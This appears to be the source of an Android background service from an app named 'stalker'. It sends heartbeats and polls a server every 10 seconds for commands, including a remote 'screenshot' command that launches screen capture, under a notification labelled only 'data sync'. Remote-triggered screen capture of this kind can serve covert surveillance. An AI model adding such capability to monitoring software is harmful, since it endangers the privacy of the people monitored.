package com.askqing.stalker.service

import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import com.askqing.stalker.StalkerApplication
import com.askqing.stalker.api.ApiClient
import com.askqing.stalker.util.PreferenceManager
import kotlinx.coroutines.*

/**
 * 数据同步服务
 * 负责心跳发送、命令轮询、离线队列处理
 * 作为后台常驻服务运行
 */
class SyncService : Service() {

    companion object {
        private const val TAG = "SyncService"

        @Volatile
        var isRunning = false
            private set
    }

    private val preferenceManager: PreferenceManager by lazy { PreferenceManager(this) }
    private val apiClient: ApiClient by lazy { ApiClient.getInstance(this) }
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private var heartbeatJob: Job? = null
    private var commandPollJob: Job? = null
    private var offlineQueueJob: Job? = null

    override fun onCreate() {
        super.onCreate()
        isRunning = true
        startForegroundNotification()
        startSyncTasks()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        heartbeatJob?.cancel()
        commandPollJob?.cancel()
        offlineQueueJob?.cancel()
        scope.cancel()
        isRunning = false
        Log.i(TAG, "同步服务已销毁")
    }

    // ==================== 同步任务 ====================

    /**
     * 启动所有同步任务
     */
    private fun startSyncTasks() {
        // 心跳任务
        heartbeatJob = scope.launch {
            while (isActive) {
                delay(preferenceManager.heartbeatInterval * 1000L)
                sendHeartbeat()
            }
        }

        // 命令轮询任务
        commandPollJob = scope.launch {
            while (isActive) {
                delay(10_000)  // 每 10 秒轮询一次
                pollCommands()
            }
        }

        // 离线队列处理任务
        offlineQueueJob = scope.launch {
            while (isActive) {
                delay(60_000)  // 每分钟尝试一次
                processOfflineQueue()
            }
        }

        Log.i(TAG, "同步任务已启动")
    }

    /**
     * 发送心跳
     */
    private suspend fun sendHeartbeat() {
        if (preferenceManager.deviceId.isEmpty()) return

        try {
            val success = apiClient.sendHeartbeat()
            if (success) {
                Log.d(TAG, "心跳已发送")
            } else {
                Log.w(TAG, "心跳发送失败")
            }
        } catch (e: Exception) {
            Log.e(TAG, "心跳异常", e)
        }
    }

    /**
     * 轮询服务器命令
     */
    private suspend fun pollCommands() {
        if (preferenceManager.deviceId.isEmpty()) return

        try {
            val command = apiClient.pollCommands() ?: return
            if (!command.hasCommand) return

            Log.i(TAG, "收到服务器命令: ${command.command}")

            when (command.command) {
                "screenshot" -> {
                    // 远程截图请求
                    command.data?.let { data ->
                        if (preferenceManager.isScreenshotEnabled && !preferenceManager.isMeetingMode) {
                            val intent = Intent(this@SyncService, ScreenshotService::class.java).apply {
                                action = "REMOTE_SCREENSHOT"
                                putExtra("stress_test", data.stressTest)
                                putExtra("interval_ms", data.intervalMs)
                            }
                            startService(intent)
                        }
                    }
                }
                "calibration" -> {
                    Log.i(TAG, "收到校准命令")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "命令轮询异常", e)
        }
    }

    /**
     * 处理离线队列
     */
    private suspend fun processOfflineQueue() {
        try {
            apiClient.processOfflineQueue()
        } catch (e: Exception) {
            Log.e(TAG, "离线队列处理异常", e)
        }
    }

    // ==================== 前台通知 ====================

    private fun startForegroundNotification() {
        val notification = createNotification()
        startForeground(5, notification)
    }

    private fun createNotification(): Notification {
        val intent = packageManager.getLaunchIntentForPackage(packageName) ?: Intent()
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        return Notification.Builder(this, StalkerApplication.CHANNEL_ID_MAIN)
            .setContentTitle("数据同步")
            .setContentText("正在后台同步数据")
            .setSmallIcon(android.R.drawable.ic_menu_upload)
            .setOngoing(true)
            .setContentIntent(pendingIntent)
            .build()
    }
}
